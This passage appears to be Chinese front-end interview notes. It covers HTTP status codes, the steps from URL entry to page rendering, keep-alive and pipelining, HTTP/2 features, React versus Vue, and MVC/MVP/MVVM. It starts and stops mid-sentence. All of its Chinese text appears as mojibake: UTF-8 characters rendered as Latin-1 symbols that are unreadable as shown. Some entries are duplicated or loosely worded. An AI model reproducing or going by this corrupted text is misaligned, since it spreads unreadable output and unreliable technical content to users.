æ˜¯ä¸€ä¸ªç›¸å¯¹æ–°çš„å¼€æºé¡¹ç›®ï¼Œæ‰€ä»¥ä¸å¤ªç¨³å®šï¼Œå®ƒæ€»æ˜¯ä¸€ç›´åœ¨å˜ï¼Œè€Œä¸”ç¼ºå°‘è¶³å¤Ÿå¤šçš„ç¬¬ä¸‰æ–¹åº“æ”¯æŒã€‚ http çŠ¶æ€ç æœ‰é‚£äº›ï¼Ÿåˆ†åˆ«ä»£è¡¨æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿç®€å•ç‰ˆï¼š 100 Continue ç»§ç»­ï¼Œä¸€èˆ¬åœ¨å‘é€ post è¯·æ±‚æ—¶ï¼Œå·²å‘é€äº† http header ä¹‹åŽæœåŠ¡ç«¯å°†è¿”å›žæ­¤ä¿¡æ¯ï¼Œè¡¨ç¤ºç¡®è®¤ï¼Œä¹‹åŽå‘é€å…·ä½“å‚æ•°ä¿¡æ¯ 200 OK æ­£å¸¸è¿”å›žä¿¡æ¯ 201 Created è¯·æ±‚æˆåŠŸå¹¶ä¸”æœåŠ¡å™¨åˆ›å»ºäº†æ–°çš„èµ„æº 202 Accepted æœåŠ¡å™¨å·²æŽ¥å—è¯·æ±‚ï¼Œä½†å°šæœªå¤„ç† 301 Moved Permanently è¯·æ±‚çš„ç½‘é¡µå·²æ°¸ä¹…ç§»åŠ¨åˆ°æ–°ä½ç½®ã€‚ 302 Found ä¸´æ—¶æ€§é‡å®šå‘ã€‚ 303 See Other ä¸´æ—¶æ€§é‡å®šå‘ï¼Œä¸”æ€»æ˜¯ä½¿ç”¨ GET è¯·æ±‚æ–°çš„ URIã€‚ 304 Not Modified è‡ªä»Žä¸Šæ¬¡è¯·æ±‚åŽï¼Œè¯·æ±‚çš„ç½‘é¡µæœªä¿®æ”¹è¿‡ã€‚ 400 Bad Request æœåŠ¡å™¨æ— æ³•ç†è§£è¯·æ±‚çš„æ ¼å¼ï¼Œå®¢æˆ·ç«¯ä¸åº”å½“å°è¯•å†æ¬¡ä½¿ç”¨ç›¸åŒçš„å†…å®¹å‘èµ·è¯·æ±‚ã€‚ 401 Unauthorized è¯·æ±‚æœªæŽˆæƒã€‚ 403 Forbidden ç¦æ­¢è®¿é—®ã€‚ 404 Not Found æ‰¾ä¸åˆ°å¦‚ä½•ä¸Ž URI ç›¸åŒ¹é…çš„èµ„æºã€‚ 500 Internal Server Error æœ€å¸¸è§çš„æœåŠ¡å™¨ç«¯é”™è¯¯ã€‚ 503 Service Unavailable æœåŠ¡å™¨ç«¯æš‚æ—¶æ— æ³•å¤„ç†è¯·æ±‚ï¼ˆå¯èƒ½æ˜¯è¿‡è½½æˆ–ç»´æŠ¤ï¼‰ã€‚ å®Œæ•´ç‰ˆ (ä¿¡æ¯ç±»)ï¼šè¡¨ç¤ºæŽ¥æ”¶åˆ°è¯·æ±‚å¹¶ä¸”ç»§ç»­å¤„ç† 100â€”â€”å®¢æˆ·å¿…é¡»ç»§ç»­å‘å‡ºè¯·æ±‚ (ä¿¡æ¯ç±»)ï¼šè¡¨ç¤ºæŽ¥æ”¶åˆ°è¯·æ±‚å¹¶ä¸”ç»§ç»­å¤„ç† - 100â€”â€”å®¢æˆ·å¿…é¡»ç»§ç»­å‘å‡ºè¯·æ±‚ - 101â€”â€”å®¢æˆ·è¦æ±‚æœåŠ¡å™¨æ ¹æ®è¯·æ±‚è½¬æ¢ HTTP åè®®ç‰ˆæœ¬ (å“åº”æˆåŠŸ)ï¼šè¡¨ç¤ºåŠ¨ä½œè¢«æˆåŠŸæŽ¥æ”¶ã€ç†è§£å’ŒæŽ¥å— 200â€”â€”è¡¨æ˜Žè¯¥è¯·æ±‚è¢«æˆåŠŸåœ°å®Œæˆï¼Œæ‰€è¯·æ±‚çš„èµ„æºå‘é€å›žå®¢æˆ·ç«¯ 201â€”â€”æç¤ºçŸ¥é“æ–°æ–‡ä»¶çš„ URL 202â€”â€”æŽ¥å—å’Œå¤„ç†ã€ä½†å¤„ç†æœªå®Œæˆ 203â€”â€”è¿”å›žä¿¡æ¯ä¸ç¡®å®šæˆ–ä¸å®Œæ•´ 204â€”â€”è¯·æ±‚æ”¶åˆ°ï¼Œä½†è¿”å›žä¿¡æ¯ä¸ºç©º 205â€”â€”æœåŠ¡å™¨å®Œæˆäº†è¯·æ±‚ï¼Œç”¨æˆ·ä»£ç†å¿…é¡»å¤ä½å½“å‰å·²ç»æµè§ˆè¿‡çš„æ–‡ä»¶ 206â€”â€”æœåŠ¡å™¨å·²ç»å®Œæˆäº†éƒ¨åˆ†ç”¨æˆ·çš„ GET è¯·æ±‚ (é‡å®šå‘ç±»)ï¼šä¸ºäº†å®ŒæˆæŒ‡å®šçš„åŠ¨ä½œï¼Œå¿…é¡»æŽ¥å—è¿›ä¸€æ­¥å¤„ç† 300â€”â€”è¯·æ±‚çš„èµ„æºå¯åœ¨å¤šå¤„å¾—åˆ° 301â€”â€”æœ¬ç½‘é¡µè¢«æ°¸ä¹…æ€§è½¬ç§»åˆ°å¦ä¸€ä¸ª URL 302â€”â€”è¯·æ±‚çš„ç½‘é¡µè¢«è½¬ç§»åˆ°ä¸€ä¸ªæ–°çš„åœ°å€ï¼Œä½†å®¢æˆ·è®¿é—®ä»ç»§ç»­é€šè¿‡åŽŸå§‹ URL åœ°å€ï¼Œé‡å®šå‘ï¼Œæ–°çš„ URL ä¼šåœ¨ response ä¸­çš„ Location ä¸­è¿”å›žï¼Œæµè§ˆå™¨å°†ä¼šä½¿ç”¨æ–°çš„ URL å‘å‡ºæ–°çš„ Requestã€‚ 303â€”â€”å»ºè®®å®¢æˆ·è®¿é—®å…¶ä»– URL æˆ–è®¿é—®æ–¹å¼ 304â€”â€”è‡ªä»Žä¸Šæ¬¡è¯·æ±‚åŽï¼Œè¯·æ±‚çš„ç½‘é¡µæœªä¿®æ”¹è¿‡ï¼ŒæœåŠ¡å™¨è¿”å›žæ­¤å“åº”æ—¶ï¼Œä¸ä¼šè¿”å›žç½‘é¡µå†…å®¹ï¼Œä»£è¡¨ä¸Šæ¬¡çš„æ–‡æ¡£å·²ç»è¢«ç¼“å­˜äº†ï¼Œè¿˜å¯ä»¥ç»§ç»­ä½¿ç”¨ 305â€”â€”è¯·æ±‚çš„èµ„æºå¿…é¡»ä»ŽæœåŠ¡å™¨æŒ‡å®šçš„åœ°å€å¾—åˆ° 306â€”â€”å‰ä¸€ç‰ˆæœ¬ HTTP ä¸­ä½¿ç”¨çš„ä»£ç ï¼ŒçŽ°è¡Œç‰ˆæœ¬ä¸­ä¸å†ä½¿ç”¨ 307â€”â€”ç”³æ˜Žè¯·æ±‚çš„èµ„æºä¸´æ—¶æ€§åˆ é™¤ (å®¢æˆ·ç«¯é”™è¯¯ç±»)ï¼šè¯·æ±‚åŒ…å«é”™è¯¯è¯­æ³•æˆ–ä¸èƒ½æ­£ç¡®æ‰§è¡Œ 400â€”â€”å®¢æˆ·ç«¯è¯·æ±‚æœ‰è¯­æ³•é”™è¯¯ï¼Œä¸èƒ½è¢«æœåŠ¡å™¨æ‰€ç†è§£ 401â€”â€”è¯·æ±‚æœªç»æŽˆæƒï¼Œè¿™ä¸ªçŠ¶æ€ä»£ç å¿…é¡»å’Œ WWW-Authenticate æŠ¥å¤´åŸŸä¸€èµ·ä½¿ç”¨ HTTP 401.1 - æœªæŽˆæƒï¼šç™»å½•å¤±è´¥ - HTTP 401.2 - æœªæŽˆæƒï¼šæœåŠ¡å™¨é…ç½®é—®é¢˜å¯¼è‡´ç™»å½•å¤±è´¥ - HTTP 401.3 - ACL ç¦æ­¢è®¿é—®èµ„æº - HTTP 401.4 - æœªæŽˆæƒï¼šæŽˆæƒè¢«ç­›é€‰å™¨æ‹’ç» HTTP 401.5 - æœªæŽˆæƒï¼šISAPI æˆ– CGI æŽˆæƒå¤±è´¥ 402â€”â€”ä¿ç•™æœ‰æ•ˆ ChargeTo å¤´å“åº” 403â€”â€”ç¦æ­¢è®¿é—®ï¼ŒæœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚ï¼Œä½†æ˜¯æ‹’ç»æä¾›æœåŠ¡ HTTP 403.1 ç¦æ­¢è®¿é—®ï¼šç¦æ­¢å¯æ‰§è¡Œè®¿é—® - HTTP 403.2 - ç¦æ­¢è®¿é—®ï¼šç¦æ­¢è¯»è®¿é—® - HTTP 403.3 - ç¦æ­¢è®¿é—®ï¼šç¦æ­¢å†™è®¿é—® - HTTP 403.4 - ç¦æ­¢è®¿é—®ï¼šè¦æ±‚ SSL - HTTP 403.5 - ç¦æ­¢è®¿é—®ï¼šè¦æ±‚ SSL 128 - HTTP 403.6 - ç¦æ­¢è®¿é—®ï¼šIP åœ°å€è¢«æ‹’ç» - HTTP 403.7 - ç¦æ­¢è®¿é—®ï¼šè¦æ±‚å®¢æˆ·è¯ä¹¦ - HTTP 403.8 - ç¦æ­¢è®¿é—®ï¼šç¦æ­¢ç«™ç‚¹è®¿é—® - HTTP 403.9 - ç¦æ­¢è®¿é—®ï¼šè¿žæŽ¥çš„ç”¨æˆ·è¿‡å¤š - HTTP 403.10 - ç¦æ­¢è®¿é—®ï¼šé…ç½®æ— æ•ˆ - HTTP 403.11 - ç¦æ­¢è®¿é—®ï¼šå¯†ç æ›´æ”¹ - HTTP 403.12 - ç¦æ­¢è®¿é—®ï¼šæ˜ å°„å™¨æ‹’ç»è®¿é—® - HTTP 403.13 - ç¦æ­¢è®¿é—®ï¼šå®¢æˆ·è¯ä¹¦å·²è¢«åŠé”€ - HTTP 403.15 - ç¦æ­¢è®¿é—®ï¼šå®¢æˆ·è®¿é—®è®¸å¯è¿‡å¤š - HTTP 403.16 - ç¦æ­¢è®¿é—®ï¼šå®¢æˆ·è¯ä¹¦ä¸å¯ä¿¡æˆ–è€…æ— æ•ˆ HTTP 403.17 - ç¦æ­¢è®¿é—®ï¼šå®¢æˆ·è¯ä¹¦å·²ç»åˆ°æœŸæˆ–è€…å°šæœªç”Ÿæ•ˆ 404â€”â€”ä¸€ä¸ª 404 é”™è¯¯è¡¨æ˜Žå¯è¿žæŽ¥æœåŠ¡å™¨ï¼Œä½†æœåŠ¡å™¨æ— æ³•å–å¾—æ‰€è¯·æ±‚çš„ç½‘é¡µï¼Œè¯·æ±‚èµ„æºä¸å­˜åœ¨ã€‚egï¼šè¾“å…¥äº†é”™è¯¯çš„ URL 405â€”â€”ç”¨æˆ·åœ¨ Request-Line å­—æ®µå®šä¹‰çš„æ–¹æ³•ä¸å…è®¸ 406â€”â€”æ ¹æ®ç”¨æˆ·å‘é€çš„ Accept æ‹–ï¼Œè¯·æ±‚èµ„æºä¸å¯è®¿é—® 407â€”â€”ç±»ä¼¼ 401ï¼Œç”¨æˆ·å¿…é¡»é¦–å…ˆåœ¨ä»£ç†æœåŠ¡å™¨ä¸Šå¾—åˆ°æŽˆæƒ 408â€”â€”å®¢æˆ·ç«¯æ²¡æœ‰åœ¨ç”¨æˆ·æŒ‡å®šçš„é¥¿æ—¶é—´å†…å®Œæˆè¯·æ±‚ 409â€”â€”å¯¹å½“å‰èµ„æºçŠ¶æ€ï¼Œè¯·æ±‚ä¸èƒ½å®Œæˆ 410â€”â€”æœåŠ¡å™¨ä¸Šä¸å†æœ‰æ­¤èµ„æºä¸”æ— è¿›ä¸€æ­¥çš„å‚è€ƒåœ°å€ 411â€”â€”æœåŠ¡å™¨æ‹’ç»ç”¨æˆ·å®šä¹‰çš„ Content-Length å±žæ€§è¯·æ±‚ 412â€”â€”ä¸€ä¸ªæˆ–å¤šä¸ªè¯·æ±‚å¤´å­—æ®µåœ¨å½“å‰è¯·æ±‚ä¸­é”™è¯¯ 413â€”â€”è¯·æ±‚çš„èµ„æºå¤§äºŽæœåŠ¡å™¨å…è®¸çš„å¤§å° 414â€”â€”è¯·æ±‚çš„èµ„æº URL é•¿äºŽæœåŠ¡å™¨å…è®¸çš„é•¿åº¦ 415â€”â€”è¯·æ±‚èµ„æºä¸æ”¯æŒè¯·æ±‚é¡¹ç›®æ ¼å¼ 416â€”â€”è¯·æ±‚ä¸­åŒ…å« Range è¯·æ±‚å¤´å­—æ®µï¼Œåœ¨å½“å‰è¯·æ±‚èµ„æºèŒƒå›´å†…æ²¡æœ‰ range æŒ‡ç¤ºå€¼ï¼Œè¯·æ±‚ä¹Ÿä¸åŒ…å« If-Range è¯·æ±‚å¤´å­—æ®µ 417â€”â€”æœåŠ¡å™¨ä¸æ»¡è¶³è¯·æ±‚ Expect å¤´å­—æ®µæŒ‡å®šçš„æœŸæœ›å€¼ï¼Œå¦‚æžœæ˜¯ä»£ç†æœåŠ¡å™¨ï¼Œå¯èƒ½æ˜¯ä¸‹ä¸€çº§æœåŠ¡å™¨ä¸èƒ½æ»¡è¶³è¯·æ±‚é•¿ã€‚ (æœåŠ¡ç«¯é”™è¯¯ç±»)ï¼šæœåŠ¡å™¨ä¸èƒ½æ­£ç¡®æ‰§è¡Œä¸€ä¸ªæ­£ç¡®çš„è¯·æ±‚ HTTP 500 - æœåŠ¡å™¨é‡åˆ°é”™è¯¯ï¼Œæ— æ³•å®Œæˆè¯·æ±‚ - HTTP 500.100 - å†…éƒ¨æœåŠ¡å™¨é”™è¯¯ - ASP é”™è¯¯ - HTTP 500-11 æœåŠ¡å™¨å…³é—­ - HTTP 500-12 åº”ç”¨ç¨‹åºé‡æ–°å¯åŠ¨ - HTTP 500-13 - æœåŠ¡å™¨å¤ªå¿™ - HTTP 500-14 - åº”ç”¨ç¨‹åºæ— æ•ˆ - HTTP 500-15 - ä¸å…è®¸è¯·æ±‚ global.asa - Error 501 - æœªå®žçŽ° HTTP 502 - ç½‘å…³é”™è¯¯ HTTP 503ï¼šç”±äºŽè¶…è½½æˆ–åœæœºç»´æŠ¤ï¼ŒæœåŠ¡å™¨ç›®å‰æ— æ³•ä½¿ç”¨ï¼Œä¸€æ®µæ—¶é—´åŽå¯èƒ½æ¢å¤æ­£å¸¸ 101â€”â€”å®¢æˆ·è¦æ±‚æœåŠ¡å™¨æ ¹æ®è¯·æ±‚è½¬æ¢ HTTP åè®®ç‰ˆæœ¬ ä¸€ä¸ªé¡µé¢ä»Žè¾“å…¥ URL åˆ°é¡µé¢åŠ è½½æ˜¾ç¤ºå®Œæˆï¼Œè¿™ä¸ªè¿‡ç¨‹ä¸­éƒ½å‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿï¼ˆæµç¨‹è¯´çš„è¶Šè¯¦ç»†è¶Šå¥½ï¼‰è¯¦ç»†ç‰ˆï¼š æµè§ˆå™¨ä¼šå¼€å¯ä¸€ä¸ªçº¿ç¨‹æ¥å¤„ç†è¿™ä¸ªè¯·æ±‚ï¼Œå¯¹ URL åˆ†æžåˆ¤æ–­å¦‚æžœæ˜¯ http åè®®å°±æŒ‰ç…§ Web æ–¹å¼æ¥å¤„ç†; è°ƒç”¨æµè§ˆå™¨å†…æ ¸ä¸­çš„å¯¹åº”æ–¹æ³•ï¼Œæ¯”å¦‚ WebView ä¸­çš„ loadUrl æ–¹æ³•; é€šè¿‡ DNS è§£æžèŽ·å–ç½‘å€çš„ IP åœ°å€ï¼Œè®¾ç½® UA ç­‰ä¿¡æ¯å‘å‡ºç¬¬äºŒä¸ª GET è¯·æ±‚; è¿›è¡Œ HTTP åè®®ä¼šè¯ï¼Œå®¢æˆ·ç«¯å‘é€æŠ¥å¤´(è¯·æ±‚æŠ¥å¤´); è¿›å…¥åˆ° web æœåŠ¡å™¨ä¸Šçš„ Web Serverï¼Œå¦‚ Apacheã€Tomcatã€Node.JS ç­‰æœåŠ¡å™¨; è¿›å…¥éƒ¨ç½²å¥½çš„åŽç«¯åº”ç”¨ï¼Œå¦‚ PHPã€Javaã€JavaScriptã€Python ç­‰ï¼Œæ‰¾åˆ°å¯¹åº”çš„è¯·æ±‚å¤„ç†; å¤„ç†ç»“æŸå›žé¦ˆæŠ¥å¤´ï¼Œæ­¤å¤„å¦‚æžœæµè§ˆå™¨è®¿é—®è¿‡ï¼Œç¼“å­˜ä¸Šæœ‰å¯¹åº”èµ„æºï¼Œä¼šä¸ŽæœåŠ¡å™¨æœ€åŽä¿®æ”¹æ—¶é—´å¯¹æ¯”ï¼Œä¸€è‡´åˆ™è¿”å›ž 304; æµè§ˆå™¨å¼€å§‹ä¸‹è½½ html æ–‡æ¡£(å“åº”æŠ¥å¤´ï¼ŒçŠ¶æ€ç  200)ï¼ŒåŒæ—¶ä½¿ç”¨ç¼“å­˜; æ–‡æ¡£æ ‘å»ºç«‹ï¼Œæ ¹æ®æ ‡è®°è¯·æ±‚æ‰€éœ€æŒ‡å®š MIME ç±»åž‹çš„æ–‡ä»¶ï¼ˆæ¯”å¦‚ cssã€jsï¼‰,åŒæ—¶è®¾ç½®äº† cookie; é¡µé¢å¼€å§‹æ¸²æŸ“ DOMï¼ŒJS æ ¹æ® DOM API æ“ä½œ DOM,æ‰§è¡Œäº‹ä»¶ç»‘å®šç­‰ï¼Œé¡µé¢æ˜¾ç¤ºå®Œæˆã€‚ ç®€æ´ç‰ˆï¼š æµè§ˆå™¨æ ¹æ®è¯·æ±‚çš„ URL äº¤ç»™ DNS åŸŸåè§£æžï¼Œæ‰¾åˆ°çœŸå®ž IPï¼Œå‘æœåŠ¡å™¨å‘èµ·è¯·æ±‚ï¼› æœåŠ¡å™¨äº¤ç»™åŽå°å¤„ç†å®ŒæˆåŽè¿”å›žæ•°æ®ï¼Œæµè§ˆå™¨æŽ¥æ”¶æ–‡ä»¶ï¼ˆHTMLã€JSã€CSSã€å›¾è±¡ç­‰ï¼‰ï¼› æµè§ˆå™¨å¯¹åŠ è½½åˆ°çš„èµ„æºï¼ˆHTMLã€JSã€CSS ç­‰ï¼‰è¿›è¡Œè¯­æ³•è§£æžï¼Œå»ºç«‹ç›¸åº”çš„å†…éƒ¨æ•°æ®ç»“æž„ï¼ˆå¦‚ HTML çš„ DOMï¼‰ï¼› è½½å…¥è§£æžåˆ°çš„èµ„æºæ–‡ä»¶ï¼Œæ¸²æŸ“é¡µé¢ï¼Œå®Œæˆã€‚ ä»€ä¹ˆæ˜¯æŒä¹…è¿žæŽ¥ï¼ŸHTTP åè®®é‡‡ç”¨â€œè¯·æ±‚-åº”ç­”â€æ¨¡å¼ï¼Œå½“ä½¿ç”¨æ™®é€šæ¨¡å¼ï¼Œå³éž keep-alive æ¨¡å¼æ—¶ï¼Œæ¯ä¸ªè¯·æ±‚å’ŒæœåŠ¡å™¨éƒ½è¦æ–°å»ºä¸€ä¸ªé“¾æŽ¥ï¼Œå®ŒæˆåŽç«‹å³æ–­å¼€è¿žæŽ¥ï¼ˆHTTP åè®®ä¸ºæ— è¿žæŽ¥çš„åè®®ï¼‰ å½“ä½¿ç”¨ keep-alive æ¨¡å¼ï¼ˆåˆç§°æŒä¹…è¿žæŽ¥ã€è¿žæŽ¥é‡ç”¨ï¼‰æ—¶ï¼Œkeep-alive åŠŸèƒ½æ˜¯å®¢æˆ·ç«¯åˆ°æœåŠ¡å™¨ç«¯çš„è¿žæŽ¥æŒç»­æœ‰æ•ˆï¼Œå½“å‡ºæ ¡å¯¹æœåŠ¡å™¨çš„åŽç»§è¯·æ±‚æ—¶ï¼Œkeep-alive åŠŸèƒ½é¿å…äº†å»ºç«‹æˆ–è€…é‡æ–°å»ºç«‹è¿žæŽ¥ ä»€ä¹ˆæ˜¯ç®¡çº¿åŒ–ï¼Ÿåœ¨ä½¿ç”¨æŒä¹…è¿žæŽ¥çš„æƒ…å†µä¸‹ï¼ŒæŸä¸ªé“¾æŽ¥ä¸Šæ¶ˆæ¯çš„ä¼ é€’ç±»ä¼¼äºŽè¯·æ±‚ 1 -&gt; x å“åº” 1 -&gt; è¯·æ±‚ 2 -&gt; å“åº” 2 ç®¡çº¿åŒ–ï¼Œåœ¨æŒä¹…è¿žæŽ¥çš„åŸºç¡€ä¸Šï¼Œç±»ä¼¼äºŽè¯·æ±‚ 1 -&gt; è¯·æ±‚ 2 -&gt; å“åº” 1 -&gt; å“åº” 2 ç®¡çº¿åŒ–ç‰¹ç‚¹ï¼š ç®¡çº¿åŒ–æœºåˆ¶é€šè¿‡æŒä¹…åŒ–å®Œæˆï¼Œä»… HTTP/1.1 æ”¯æŒ åªæœ‰ GET å’Œ HEAD è¯·æ±‚å¯ä»¥è¿›è¡Œç®¡çº¿åŒ–ï¼Œè€Œ POST æœ‰æ‰€é™åˆ¶ ç®¡çº¿åŒ–ä¸ä¼šå½±å“å“åº”åˆ°æ¥çš„é¡ºåº æœåŠ¡å™¨ç«¯æ”¯æŒç®¡çº¿åŒ–ï¼Œå¹¶ä¸è¦æ±‚æœåŠ¡å™¨ç«¯ä¹Ÿå¯¹å“åº”è¿›è¡Œç®¡çº¿åŒ–å¤„ç†ï¼Œåªæ˜¯è¦æ±‚å¯¹äºŽç®¡çº¿åŒ–çš„è¯·æ±‚ä¸å¤±è´¥ HTTP/1.1 ä¸Ž HTTP/2.0 çš„åŒºåˆ« å¤šè·¯å¤ç”¨ HTTP/2.0 ä½¿ç”¨å¤šè·¯å¤ç”¨æŠ€æœ¯ï¼Œä½¿ç”¨åŒä¸€ä¸ª TCP è¿žæŽ¥æ¥å¤„ç†å¤šä¸ªè¯·æ±‚ã€‚ é¦–éƒ¨åŽ‹ç¼© HTTP/1.1 çš„é¦–éƒ¨å¸¦æœ‰å¤§é‡ä¿¡æ¯ï¼Œè€Œä¸”æ¯æ¬¡éƒ½è¦é‡å¤å‘é€ã€‚HTTP/2.0 è¦æ±‚é€šè®¯åŒæ–¹å„è‡ªç¼“å­˜ä¸€ä»½é¦–éƒ¨å­—æ®µè¡¨ï¼Œä»Žè€Œé¿å…äº†é‡å¤ä¼ è¾“ã€‚ æœåŠ¡ç«¯æŽ¨é€ åœ¨å®¢æˆ·ç«¯è¯·æ±‚ä¸€ä¸ªèµ„æºæ—¶ï¼Œä¼šæŠŠç›¸å…³çš„èµ„æºä¸€èµ·å‘é€ç»™å®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯å°±ä¸éœ€è¦å†æ¬¡å‘èµ·è¯·æ±‚äº†ã€‚ä¾‹å¦‚å®¢æˆ·ç«¯è¯·æ±‚ index.html é¡µé¢ï¼ŒæœåŠ¡ç«¯å°±æŠŠ index.js ä¸€èµ·å‘é€ç»™å®¢æˆ·ç«¯ã€‚ äºŒè¿›åˆ¶æ ¼å¼ HTTP/1.1 çš„è§£æžåŸºäºŽæ–‡æœ¬çš„ï¼Œè€Œ HTTP/2.0 é‡‡ç”¨äºŒçº§åˆ¶æ ¼å¼ã€‚ React å’Œ Vue ç›¸ä¼¼ä¹‹å¤„å’Œä¸åŒä¹‹å¤„ï¼ŸReact å’Œ Vue ç›¸ä¼¼ä¹‹å¤„ï¼š ä½¿ç”¨ Virtual DOM æä¾›äº†å“åº”å¼ï¼ˆReactiveï¼‰å’Œç»„ä»¶åŒ–ï¼ˆComposableï¼‰çš„è§†å›¾ç»„ä»¶ å°†æ³¨æ„åŠ›é›†ä¸­ä¿æŒåœ¨å’Œæ ¸å¿ƒåº“ï¼Œè€Œå°†å…¶ä»–åŠŸèƒ½å¦‚è·¯ç”±å’Œå…¨å±€çŠ¶æ€äº¤ç»™ç›¸å…³çš„åº“ ä¸åŒä¹‹å¤„ï¼š React æœ‰æ›´ä¸°å¯Œçš„ç”Ÿæ€ç³»ç»Ÿ React åœ¨æŸä¸ªç»„ä»¶çŠ¶æ€å‘ç”Ÿå˜åŒ–æ—¶ï¼Œå®ƒä¼šä»¥è¯¥ç»„ä»¶ä¸ºæ ¹ï¼Œé‡æ–°æ¸²æŸ“æ•´ä¸ªç»„ä»¶å­æ ‘ï¼Œè€Œ Vue è‡ªåŠ¨è¿½è¸ªï¼Œç²¾ç¡®çŸ¥æ™“å“ªä¸ªç»„ä»¶éœ€è¦è¢«é‡æ¸²æŸ“ React æ¸²æŸ“åŠŸèƒ½ä¾é  JSXï¼Œæ”¯æŒç±»åž‹æ£€æŸ¥ã€ç¼–è¯‘å™¨è‡ªåŠ¨å®Œæˆï¼Œlintingï¼ŒVue é»˜è®¤æŽ¨èçš„è¿˜æ˜¯æ¨¡æ¿ CSS ä½œç”¨åŸŸåœ¨ React ä¸­æ˜¯é€šè¿‡ CSS-in-JS æ–¹æ¡ˆå®žçŽ°ï¼ŒVue è®¾ç½®æ ·å¼çš„é»˜è®¤æ–¹æ³•æ—¶å•æ–‡ä»¶ç»„ä»¶é‡Œç±»ä¼¼ style çš„æ ‡ç­¾ ç¼–å†™æœ‰æœ¬åœ°æ¸²æŸ“èƒ½åŠ›çš„ APPï¼ŒReact æœ‰ React Nativeï¼Œæ¯”è¾ƒæˆç†Ÿã€‚Vue æœ‰ Weexï¼Œè¿˜åœ¨å¿«é€Ÿå‘å±•ä¸­ å¯¹ MVVM çš„è®¤è¯†ï¼Ÿ å…ˆèŠä¸€ä¸‹ MVC MVCï¼šModelï¼ˆæ¨¡åž‹ï¼‰ Viewï¼ˆè§†å›¾ï¼‰ Controllerï¼ˆæŽ§åˆ¶å™¨ï¼‰ï¼Œä¸»è¦æ˜¯åŸºäºŽåˆ†å±‚çš„ç›®çš„ï¼Œè®©å½¼æ­¤çš„èŒè´£åˆ†å¼€ã€‚ View é€šè¿‡ Controller å’Œ Model è”ç³»ï¼ŒController æ˜¯ View å’Œ Model çš„åè°ƒè€…ï¼Œview å’Œ Model ä¸ç›´æŽ¥è”ç³»ï¼ŒåŸºæœ¬è”ç³»éƒ½æ˜¯å•å‘çš„ã€‚ é¡ºå¸¦æä¸‹ MVP MVPï¼šæ˜¯ä»Ž MVC æ¨¡å¼æ¼”å˜è€Œæ¥çš„ï¼Œéƒ½æ˜¯é€šè¿‡ Controller/Presenter è´Ÿè´£é€»è¾‘çš„å¤„ç†+Model æä¾›æ•°æ®+View è´Ÿè´£æ˜¾ç¤ºã€‚ åœ¨ MVP ä¸­ï¼ŒPresenter å®Œå…¨æŠŠ View å’Œ Model è¿›è¡Œåˆ†ç¦»ï¼Œä¸»è¦çš„ç¨‹åºé€»è¾‘åœ¨ Presenter é‡Œå®žçŽ°ã€‚å¹¶ä¸”ï¼ŒPresenter å’Œ View æ˜¯æ²¡æœ‰ç›´æŽ¥å…³è”çš„ï¼Œæ˜¯é€šè¿‡å®šä¹‰å¥½çš„æŽ¥å£è¿›è¡Œäº¤äº’ï¼Œä»Žè€Œä½¿å¾—åœ¨å˜æ›´ View çš„æ—¶å€™å¯ä»¥ä¿æŒ Presenter ä¸å˜ã€‚è¿™æ ·å¯ä»¥åœ¨æ²¡æœ‰ view å±‚å°±å¯ä»¥å•å…ƒæµ‹è¯•ã€‚ å†èŠèŠ MVVN MVVMï¼šModel + View + ViewModelï¼ŒæŠŠ MVC ä¸­çš„ Controller å’Œ MVP ä¸­çš„ Presenter æ”¹æˆ ViewModel view çš„å˜åŒ–ä¼šè‡ªåŠ¨æ›´æ–°åˆ° ViewModelï¼ŒViewModel çš„å˜åŒ–ä¹Ÿä¼šè‡ªåŠ¨åŒæ­¥åˆ° View ä¸Šæ˜¾ç¤ºã€‚è¿™ç§è‡ªåŠ¨åŒæ­¥æ˜¯å› ä¸º ViewModel ä¸­çš„å±žæ€§å®žçŽ°äº† Observerï¼Œå½“å±žæ€§å˜æ›´æ—¶éƒ½èƒ½è§¦å‘å¯¹åº”æ“ä½œã€‚ View æ˜¯ HTML æ–‡æœ¬çš„ js æ¨¡æ¿ï¼› ViewModel æ˜¯ä¸šåŠ¡é€»è¾‘å±‚ï¼ˆä¸€åˆ‡ js å¯è§†ä¸šåŠ¡é€»è¾‘ï¼Œæ¯”å¦‚è¡¨å•æŒ‰é’®æäº¤ï¼Œè‡ªå®šä¹‰äº‹ä»¶çš„æ³¨å†Œå’Œå¤„ç†é€»è¾‘éƒ½åœ¨ viewmodel é‡Œé¢è´Ÿè´£ç›‘æŽ§ä¸¤è¾¹çš„æ•°æ®ï¼‰ï¼› Model æ•°æ®å±‚ï¼Œå¯¹æ•°æ®çš„å¤„ç†ï¼ˆä¸ŽåŽå°æ•°æ®äº¤äº’çš„å¢žåˆ æ”¹æŸ¥ï¼‰ æä¸€ä¸‹æˆ‘ç†Ÿæ‚‰çš„ MVVM æ¡†æž¶ï¼švue.jsï¼ŒVue.js æ˜¯ä¸€ä¸ªæž„å»ºæ•°æ®é©±åŠ¨çš„ web ç•Œé¢çš„æ¸è¿›å¼æ¡†æž¶ã€‚Vue.js çš„ç›®æ ‡æ˜¯é€šè¿‡å°½å¯èƒ½ç®€å•çš„ API å®žçŽ°å“åº”çš„æ•°æ®ç»‘å®šå’Œç»„åˆçš„è§†å›¾ç»„ä»¶ã€‚æ ¸å¿ƒæ˜¯ä¸€ä¸ªå“åº”çš„æ•°æ®ç»‘å®šç³»ç»Ÿã€‚ ä¸€å¥è¯æ€»ç»“ä¸‹ä¸åŒä¹‹å¤„ MVC ä¸­è”ç³»æ˜¯å•å‘çš„ï¼ŒMVP ä¸­ P å’Œ V é€šè¿‡æŽ¥å£äº¤äº’ï¼ŒMVVM çš„è”ç³»æ˜¯åŒå‘çš„ DOM å…ƒç´  e çš„ e.getAttribute(propName)å’Œ e.propName æœ‰ä»€ä¹ˆåŒºåˆ«å’Œè”ç³»ï¼Ÿ e.getAttribute()ï¼Œæ˜¯æ ‡å‡† DOM æ“ä½œæ–‡æ¡£å…ƒç´ å±žæ€§çš„æ–¹æ³•ï¼Œå…·æœ‰é€šç”¨æ€§å¯åœ¨ä»»æ„æ–‡æ¡£ä¸Šä½¿ç”¨ï¼Œè¿”å›žå…ƒç´ åœ¨æºæ–‡ä»¶ä¸­è®¾ç½®çš„å±žæ€§ï¼› e.propName é€šå¸¸æ˜¯åœ¨ HTML 